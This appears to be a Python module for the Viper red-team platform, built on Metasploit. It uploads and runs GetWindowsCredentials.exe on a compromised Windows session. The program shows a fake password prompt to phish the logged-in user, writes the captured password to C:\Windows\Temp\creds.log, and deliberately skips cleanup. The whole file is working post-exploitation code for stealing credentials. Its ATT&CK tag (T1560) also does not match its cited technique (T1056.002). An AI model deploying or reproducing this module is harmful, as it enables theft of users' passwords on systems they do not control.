# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :


from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME_ZH = "UI提示框获取用户输入的密码"
    DESC_ZH = "通过在UI界面弹出输入密码提示框,获取用户密码."

    NAME_EN = "UI PromptBox get the password entered by the user"
    DESC_EN = "Get the user password by popping up a password input prompt box on the UI interface."

    MODULETYPE = TAG2TYPE.Credential_Access
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1560"]  # ATTCK向量
    REFERENCES = ["https://attack.mitre.org/techniques/T1056/002/",
                  "https://github.com/Rvn0xsy/GetWindowsCredentials"]
    README = ["https://www.yuque.com/vipersec/module/log2gg"]
    AUTHOR = ["Viper"]
    REQUIRE_SESSION = True
    OPTIONS = register_options([])

    def __init__(self, sessionid, ipaddress, custom_param):
        super().__init__(sessionid, ipaddress, custom_param)
        self.type = "post"
        self.mname = "multi/manage/upload_and_exec_api"
        self.outfile = None

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)

        if session.is_windows:
            self.set_msf_option("LPATH", "GetWindowsCredentials.exe")
            self.set_msf_option("RPATH", "GWC.exe")
        else:
            return False, "模块只支持Windows Session", "This module only supports Meterpreter for Windows"
        self.set_msf_option("CLEANUP", False)
        self.set_msf_option("TIMEOUT", 3)
        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败", "Module execution failed")
            self.log_error(message, message)
            return
        self.log_info("模块执行完成", "Module operation completed")
        self.log_good(f"用户输入的密码存放在C:\\Windows\\Temp\\creds.log,请手动通过session文件浏览查看",
                      f"The password entered by the user is stored in C:\\windows\\temp\\creds.log. Please browse the session file manually")
